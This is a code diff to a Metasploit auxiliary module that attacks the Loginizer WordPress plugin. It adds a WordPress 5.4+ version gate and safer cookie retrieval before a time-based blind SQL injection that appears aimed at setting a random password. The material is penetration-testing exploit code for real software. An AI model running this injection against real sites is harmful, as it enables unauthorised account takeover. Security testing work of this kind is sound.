@@ -51,6 +51,17 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
+    wp_ver = wordpress_version
+    if wp_ver.nil?
+      vprint_error('Unable to determine wordpress version, check settings.')
+      return
+    end
+
+    if Gem::Version.new(wp_ver) < Gem::Version.new('5.4')
+      vprint_error("Wordpress (core) #{wp_ver} is unexploitable.  Version 5.4+ required.")
+      return
+    end
+
     checkcode = check_plugin_version_from_readme('loginizer', '1.6.4')
     if checkcode == Msf::Exploit::CheckCode::Safe
       vprint_error('Loginizer version not vulnerable')
@@ -59,7 +70,15 @@ class MetasploitModule < Msf::Auxiliary
       print_good('Vulnerable version detected')
     end
 
-    cookie = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'wp-login.php') }).get_cookies
+    cookie = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'wp-login.php')
+    })
+    if cookie.nil?
+      print_error('Unable to retrieve wordpress cookie, check settings.')
+      return
+    end
+    cookie = cookie.get_cookies
     password = Rex::Text.rand_text_alpha(10)
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
